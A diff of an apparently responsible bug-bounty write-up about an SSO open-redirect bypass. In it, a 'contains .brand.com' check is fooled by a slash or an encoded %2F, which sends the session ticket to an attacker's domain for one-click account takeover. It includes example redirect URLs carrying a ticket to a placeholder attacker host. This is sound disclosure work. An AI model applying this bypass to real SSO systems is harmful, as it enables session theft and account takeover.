@@ -1,5 +1,5 @@
 ---
-title:       "It was not an open redirect: it was the victim's session walking out the door"
+title:       "One-click account takeover: the SSO open redirect handed over the session ticket"
 summary:     "An SSO `host` parameter accepted foreign domains if you stuck a slash in the right place. What went to the attacker's domain was not the user — it was their session ticket. One click and the account changes hands."
 date:        2026-11-11 20:10:00 +0100
 lang:        en
@@ -45,11 +45,7 @@ To know where to send you back, the SSO accepts a URL parameter:
 https://sso.example.tld/doLogin?host=app.example.tld
 ```
 
-<div class="plain" markdown="1">
-**In plain words:** `host` is the "where do I send you when you are done?". It is a
-parameter that travels in the link, so it is written by whoever makes the link. And whoever
-makes the link can be anyone.
-</div>
+That parameter travels in the link, so it is written by whoever makes the link. And whoever makes the link can be anyone.
 
 ## First attempt: rejected — and that is good news
 
@@ -62,12 +58,10 @@ https://sso.example.tld/doLogin?host=attacker-example.com
 Response: **rejected**, with an internal error code. The server does not swallow just
 anything.
 
-<div class="plain" markdown="1">
-**In plain words:** this is where a lot of people close the tab and leave. I do the
+This is where a lot of people close the tab and leave. I do the
 opposite: a **rejection** means there is a control, and a control is something you can
 **study**. If it had accepted my domain straight away, it would be a trivial bug. The
 rejection turns the question into a much better one: *what exact rule is it applying?*
-</div>
 
 And that question is the one that pays.
 
@@ -93,14 +87,12 @@ Look at these three parameter values and think about where the user ends up:
   <figcaption>The browser cuts at the first slash. The check looks at the whole string. That is the gap.</figcaption>
 </figure>
 
-<div class="plain" markdown="1">
-**In plain words:** the browser decides the destination using whatever comes **before the
+The browser decides the destination using whatever comes **before the
 first slash**. Everything after that is the path, the "inside" of that site. So
 `attacker.com/.brand.com` is a page called `.brand.com` on the attacker's server.
 
 But if the server only checks whether the text *contains* `.brand.com`… it contains it. It
 passes the check. And it sends you to the attacker's house.
-</div>
 
 The `%2F` in the third example is a slash written in URL encoding. The server
 **decodes** it before comparing and before building the redirect, so it ends up being a
@@ -130,14 +122,12 @@ ticket went, whole, to the attacker's domain:
 https://attacker-example.com/.brand-example.com?ticket=a1b2c3d4e5f6...
 ```
 
-<div class="plain" markdown="1">
-**In plain words:** imagine the building's doorman, instead of walking you to your flat,
+Imagine the building's doorman, instead of walking you to your flat,
 hands **the key** to whoever quotes an address that looks like yours. It is not that he
 sent you to the wrong place: he gave away the key on the way.
 
 And since the attacker owns that server, they read the ticket in their own access log. They
 do not even need the victim to do anything else.
-</div>
 
 ## The one-click case
 
@@ -147,6 +137,12 @@ sees the cookies, accepts the identity and issues the ticket **straight away**.
 
 The victim makes **one click** on a link whose visible domain is the real vendor's. They
 type no password. They see nothing odd. And the ticket is already in the attacker's hands.
+
+<figure>
+  <img src="{{ '/assets/img/writeups/open-redirect-sso/03-cadena-en.svg' | relative_url }}"
+       alt="Diagram of the five steps: the victim opens the link, the SSO issues the ticket without asking for a password, the redirect carries it to the attacker's domain, who reads it in their log and redeems it from a clean session">
+  <figcaption>Five steps and one action by the victim. What travels in the redirect is a credential.</figcaption>
+</figure>
 
 ## Redeeming the ticket
 
@@ -188,11 +184,9 @@ sessionId: <the victim's>
 It returned their personal data **in clear text**, including the full email address — while
 the application's own interface shows it masked.
 
-<div class="plain" markdown="1">
-**In plain words:** the app shows you `j***@gmail.com` because it considers the email
+The app shows you `j***@gmail.com` because it considers the email
 sensitive. The API returns it whole. That difference is the proof that what I am holding is
 not "some session": it is **that person's identity**.
-</div>
 
 And I stopped there. No devices touched, nothing modified, nothing accessed beyond the test
 account.
@@ -207,26 +201,17 @@ Three counter-tests, and the first is the one that really matters:
 | Same endpoint with a **fabricated** session id | `401` | That the API answered anyone |
 | Same endpoint with **no** session id | `401` | That this data was public |
 
-<div class="plain" markdown="1">
-**In plain words:** the first row is the jewel of the report. It proves the server
+The first row is the jewel of the report. It proves the server
 **validates** that parameter, and that the only thing standing between a rejection and a
 stolen session is **one slash**. That turns "I put my domain in and it worked" into "I found
 how to bypass your control". Two very different reports to whoever triages them.
-</div>
 
 ## A bonus: the cookie that cancelled the protection
 
 Looking at the cookies set when the ticket is redeemed, I saw that one of them carried
 **the same session id in clear** and, unlike the main one, **without the `HttpOnly` flag**.
 
-<div class="plain" markdown="1">
-**In plain words:** `HttpOnly` is a flag telling the browser *"do not show this value to
-JavaScript"*. It exists so that an XSS bug cannot steal the session.
-
-But if the **same** identifier also travels in a second cookie without that flag, the
-protection on the first one is worth nothing: any script reads it from the other. It is
-locking a door and leaving the window next to it open.
-</div>
+If the **same** identifier also travels in a second cookie without that flag, the protection on the first one is worth nothing: any script reads it from the other. It is locking a door and leaving the window next to it open.
 
 ## Impact
 
